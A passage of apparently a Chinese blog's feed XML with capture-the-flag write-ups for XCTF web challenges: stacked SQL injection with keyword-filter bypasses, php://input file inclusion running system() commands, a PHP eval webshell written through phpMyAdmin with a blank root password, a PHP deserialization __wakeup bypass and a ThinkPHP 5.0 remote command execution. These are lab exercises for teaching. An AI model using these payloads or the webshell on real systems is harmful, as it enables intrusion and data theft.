src="https://img-blog.csdnimg.cn/20201102201007827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_003</title>
      <link href="2020/11/15/XCTF/XCTF_Web-003/"/>
      <url>2020/11/15/XCTF/XCTF_Web-003/</url>
      
        <content type="html"><![CDATA[<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>这里使用谷歌浏览器<br>拿到题目后，发现是单引号报错字符型注入<br><img src="https://img-blog.csdnimg.cn/20201030213318460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用order by语句判断出两个字段：order by 2的时候页面正常回显，order by 3的时候页面出错。<br>使用union select联合查询，发现关键字select被正则过滤了<br><img src="https://img-blog.csdnimg.cn/20201030215019329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>因此，需要绕过select的过滤<br>解法一：<br>（1）堆叠注入/?inject=-1’;show tables –+<br><img src="https://img-blog.csdnimg.cn/20201030215208646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(2)发现了两张表，分别查询两张表中的字段，<br>/?inject=-1’;show columns from <code>1919810931114514</code> –+<br><img src="https://img-blog.csdnimg.cn/20201030215234255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>/?inject=-1’;show columns from <code>words</code> –+<br><img src="https://img-blog.csdnimg.cn/20201030215807801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(3)发现了flag在第一个表中，接下来就是要查看flag的内容了。但是select被过滤了，这里可以采用预编译的方式绕过。</p><pre><code>?inject=-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from \`1919810931114514\`;&#39;);prepare aaa from @sql;EXECUTE aaa;#</code></pre><p><img src="https://img-blog.csdnimg.cn/2020103021590551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）这里用strstr函数过滤了’set’和’prepare’关键词，利用strstr不能区分大小写，将其改为大写即可</p><pre><code>/?inject=-1&#39;;sEt @sql = CONCAT(&#39;sele&#39;,&#39;ct * from \`1919810931114514\`;&#39;);prepArE aaa from @sql;EXECUTE aaa;#</code></pre><p>或者</p><pre><code>/?inject=-1&#39;;sEt @sql = CONCAT(&#39;se&#39;,&#39;lect * from \`1919810931114514\`;&#39;);prEpare stmt from @sql;EXECUTE stmt;#</code></pre><p>或者</p><pre><code>/?inject=-1&#39;;use supersqli;set @sql=concat(&#39;s&#39;,&#39;elect * from \`1919810931114514\`&#39;);PREPARE pre FROM @sql;EXECUTE pre;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030220213454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>handler查询<br>在查找到有两张表的前提下进行<br>（1）使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行</p><pre><code>/?inject=-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030220325455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法三：<br>（1）修改表名和列名，在查找到两个表后，看一下第二个表<br><img src="https://img-blog.csdnimg.cn/20201030220350522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）其中有一个列就是data列，是可以进行查询的。所以这里将表1919810931114514名字改为words，flag列名字改为id，就可以查询flag的内容了。</p><pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#</code></pre><p>其中：<br>alter table words rename to aaaa;先把原来的words表名字改成别的，这个随便<br>alter table`1919810931114514` rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>（3）然后用1’ or 1=1 –+直接就能得到正确结果<br><img src="https://img-blog.csdnimg.cn/20201030220617899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_002</title>
      <link href="2020/11/15/XCTF/XCTF_Web-002/"/>
      <url>2020/11/15/XCTF/XCTF_Web-002/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-php-include-考察文件包含"><a href="#Web-php-include-考察文件包含" class="headerlink" title="Web_php_include(考察文件包含)"></a>Web_php_include(考察文件包含)</h2><p>strstr函数：strstr(字符串,你要搜索的内容,false)<br>#字符串：也就是代码中的<code>$page</code>。例如：在url后面添加 /?page=123456，那么<code>$page</code>的内容就是123456。</p><p>#你要搜索的内容：也就是题目中的php://。意思就是该函数会从$page的内容里去寻找php://，而这里是一个while语句，一旦查找到php://，那么就会执行大括号里面的语句。</p><p>#false：该参数默认是false，也就是一般情况只需要写前两个参数即可。false代表匹配到php://之后，会输出php://和之后的内容。而如果为true，则会输出“php.”，也就是php://前面的内容。    例如URL为<br><a href="http://111.198.29.45:50769/?page=php.php://input">http://111.198.29.45:50769/?page=php.php://input</a><br>那么传入的$page的内容就是php://input，而前面的“php.”就会被丢弃。</p><p>#注：strstr函数对大小写敏感，也就是会区分大小写。</p><p>str_replace()以其他字符替换字符串中的一些字符(区分大小写)：<br>例如：str_replace(“1”，“2”，“123”)会输出223。因为会将全部的1替换为2。</p><p><img src="https://img-blog.csdnimg.cn/20201030190525283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开页面是这样一段代码，从代码中得知page中带有php://的都会被替换成空,程序过滤掉了page=参数传入php://<br>strstr() 查找字符串首次出现的位置。返回字符串剩余部分</p><p>解法一（大小写绕过）：<br>（1）由于strstr()这个函数是区分大小写的，所以可以用PHP://来代替。即<a href="http://220.249.52.133:45015/?page=PHP://input">http://220.249.52.133:45015/?page=PHP://input</a><br><img src="https://img-blog.csdnimg.cn/20201030190758224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）首先使用手动代理配置，打开burp工具，配置拦截请求，刷新网页后，进行burp抓包<br><img src="https://img-blog.csdnimg.cn/20201030190840259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030190850501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）post传参<?php system("ls");?>，在burp中点击废包查看<br><img src="https://img-blog.csdnimg.cn/20201030190925996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030190938284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发送到Repeater，在重发器中点击发送，可看到fl4gisisish3r3.php<br><img src="https://img-blog.csdnimg.cn/20201030191123792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201030191014504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）继续post传参<?php system("cat fl4gisisish3r3.php");?>，即可看到flag<br><img src="https://img-blog.csdnimg.cn/20201030191041787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030191102198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>（1）while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。代码中的hello是有回显的，可以命令执行然后回显到浏览器<br><img src="https://img-blog.csdnimg.cn/20201030191238482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）构造payload，默认页面为<a href="http://127.0.0.1/index.php,%E8%AE%BE%E7%BD%AE%E4%B8%BApage%E5%80%BC%EF%BC%8C%E5%8F%AF%E7%A1%AE%E4%BF%9Dwhile%E4%B8%BA%E7%9C%9F%EF%BC%8C%E8%AE%A9page%E5%8F%82%E6%95%B0%E7%94%A8http%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AE%BF%E9%97%AE127.0.0.1%E8%BF%99%E4%B8%AA%E6%9D%A1%E4%BB%B6%E8%82%AF%E5%AE%9A%E4%B8%BA%E7%9C%9F%E3%80%82">http://127.0.0.1/index.php,设置为page值，可确保while为真，让page参数用http伪协议访问127.0.0.1这个条件肯定为真。</a><br><img src="https://img-blog.csdnimg.cn/20201030191315511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）看到了三个文件，继续构造payload，查看fl4gisisish3r3.php，发现flag<br><img src="https://img-blog.csdnimg.cn/20201030191342427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法三：<br>（1）用御剑扫描后台，会扫到phpmyadmin后台<br><img src="https://img-blog.csdnimg.cn/20201030191434792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）双击它进入登录界面，用户名输入为root，密码为空。（弱口令）进入<br><img src="https://img-blog.csdnimg.cn/20201030191457439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）进入SQL语句输入的地方，执行命令show variables like “secure_file_priv”查看secure_file_priv是否为空，为空则可以写数据，如果是null则不能写。<br><img src="https://img-blog.csdnimg.cn/20201030191525711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）进入SQL语句输入的地方，编辑一句话木马并执行select”<?php eval($_POST(shell);?> “ into outfile ‘/tmp/songrong.php’<br>其中shell为口令，可任意修改，songrong也可修改。Linux默认tmp是可写目录，所以在tmp目录下写入<br><img src="https://img-blog.csdnimg.cn/2020103019155011.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）然后打开菜刀类工具中国蚁剑，输入URL和密码连接<br><img src="https://img-blog.csdnimg.cn/20201030191609307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）连接成功后，打开文件管理，可发现flag<br><img src="https://img-blog.csdnimg.cn/20201030191713431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030191720118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_001</title>
      <link href="2020/11/15/XCTF/XCTF_Web-001/"/>
      <url>2020/11/15/XCTF/XCTF_Web-001/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p><img src="https://img-blog.csdnimg.cn/20201030180847595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180905654.png#pic_center" alt="在这里插入图片描述"><br>（1）按照提示，初始界面想到index.php，再次请求index.php后仍是1.php(被重定向了)。F12打开开发者模式查看“网络”模块，查看返回包发现确实有index.php，并且其中的location参数被设置为了1.php，同时发现flag<br><img src="https://img-blog.csdnimg.cn/20201030181023278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(2)也可以访问index.php，用Burp抓包，在响应包中发现flag<br><img src="https://img-blog.csdnimg.cn/20201030181133758.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201030181059758.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p><img src="https://img-blog.csdnimg.cn/20201030181220449.png#pic_center" alt="在这里插入图片描述"><br>（1）根据题目，熟悉robots.txt，在URL后加上/robots.txt<br><img src="https://img-blog.csdnimg.cn/20201030181244238.png#pic_center" alt="在这里插入图片描述"><br>（2）发现一个fl0g.php文件，在URL后加上fl0g.php访问，得到flag<br><img src="https://img-blog.csdnimg.cn/20201030181314103.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>（1）先是一段代码审计</p><pre><code>&lt;?php class Demo &#123;     private $file = &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file = $file;  //构造函数，对类的变量进行初始化    &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;//魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法    function __wakeup() &#123;         if ($this-&gt;file != &#39;index.php&#39;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var = base64_decode($_GET[&#39;var&#39;]); //正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式&#125;)，不区分大小写，就输出stop hacking!否则的话就进行发序列化    if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;</code></pre><p>（2）审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了<br>在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。<br>在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。</p><pre><code>&lt;?phpclass Demo &#123;private $file = &#39;index.php&#39;;//protected $file1 = &#39;index.php&#39;;public function __construct($file) &#123;    $this-&gt;file = $file;    //$this-&gt;file1 = $file1;&#125;function __destruct() &#123;    echo @highlight_file($this-&gt;file, true);&#125;function __wakeup() &#123;    if ($this-&gt;file != &#39;index.php&#39;) &#123;        //the secret is in the fl4g.php        $this-&gt;file = &#39;index.php&#39;;    &#125;&#125;&#125;$a = new Demo(&quot;fl4g.php&quot;);echo serialize($a).&quot;\n&quot;;//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;echo base64_encode(&#39;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#39;);</code></pre><p>使用代码在线工具执行,<a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a><br><img src="https://img-blog.csdnimg.cn/20201030182243753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改之后，再进行base64加密，传参就可以了<br>index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br><img src="https://img-blog.csdnimg.cn/20201030182357578.png#pic_center" alt="在这里插入图片描述"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p><img src="https://img-blog.csdnimg.cn/20201030182600616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（1）进入后发现是一个php框架，根据题目php-rce远程命令执行，在github上查一下这个版本有什么漏洞<br><img src="https://img-blog.csdnimg.cn/20201030182613799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030182621814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030182634128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现有好几个版本，由于只知道是5.0，则随便输入一个试试，这里注意只从”?s”开始复制，”?s”之前的是靶场。<br><img src="https://img-blog.csdnimg.cn/20201030182714277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到进一步提示，为5.0.2版本，回到github找到5.0.2版本的再次复制，然后访问。发现可以进行远程命令执行。<br><img src="https://img-blog.csdnimg.cn/20201030182750642.png#pic_center" alt="在这里插入图片描述"><br>（4）ls查看有没有什么提示信息，可用hackbar执行，或者直接在地址栏输入命令也可。这里注意要把原来最后一个”=”后面的东西删掉再输入命令。<br><img src="https://img-blog.csdnimg.cn/20201030182851546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）ls后没有发现有用信息，接着查找上一级目录，直到发现flag<br><img src="https://img-blog.csdnimg.cn/20201030182918127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）然后输入查看命令 cat /flag即可看到flag<br><img src="https://img-blog.csdnimg.cn/20201030182941486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）也可以无需一级一级目录的找，使用命令find / -name flag,也可找到flag，然后cat /flag 就可以看到flag了。<br><img src="https://img-blog.csdnimg.cn/2020103018301474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web练习区</title>
      <link href="2020/11/15/XCTF/XCTF_Web%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
      <url>2020/11/15/XCTF/XCTF_Web%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>这里右键无法查看网页源代码，可通过f12键或者在url地址前加上”view-source:”查看网页源代码找到flag。<br><img src="https://img-blog.csdnimg.cn/20201030160950637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p><img src="https://img-blog.csdnimg.cn/20201030164830774.png#pic_center" alt="在这里插入图片描述"><br>HTTP常用的请求方法：get，post。<br>（1）直接把请求参数拼接在URL后面，以？间隔URL和参数，若有多个参数，则以&amp;间隔参数</p><pre><code>http://220.249.52.133:55274/？a=1</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030165030814.png#pic_center" alt="在这里插入图片描述"><br>（2）post：提交post请求用插件hackbar。首先置入URL，选择POST Data，输入post请求，然后执行。<br><img src="https://img-blog.csdnimg.cn/2020103016523695.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030165306845.png#pic_center" alt="在这里插入图片描述"></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>（1）在URL后加上/robots.txt并访问，发现f1ag_1s_h3re.php<br>（2）构造payload，查看f1ag_1s_h3re.php得到flag<br><img src="https://img-blog.csdnimg.cn/20201030161138484.png#pic_center" alt="在这里插入图片描述"><br>（3）也可使用扫目录脚本dirsearch(<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>)</p><pre><code>python dirsearch.py -u http://10.10.10.175:32793/ -e *</code></pre><p><img src="https://img-blog.csdnimg.cn/20201106220705211.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201106220759963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>#使用dirsear需要在Python3环境下</p><p>#robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p><img src="https://img-blog.csdnimg.cn/202010301614129.png#pic_center" alt="在这里插入图片描述"><br>（1）常见的备份文件后缀名有：”.gif”、”.svn”、”.swp”、”~”、”.bak”、”.bash_history”、”.bkf”（共7种）<br>根据提示index.php文件进行备份，逐个尝试构造备份链接。找到.bak的备份文件<br><img src="https://img-blog.csdnimg.cn/20201030161651393.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030161701370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）下载备份文件直接打开就能够找到flag。<br>（3）也可以使用目录扫描工具dirsearch扫出index.php.bak文件，然后构造链接即可。<br><img src="https://img-blog.csdnimg.cn/20201106221347697.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201106221416497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="cookie"><a href="#cookie" 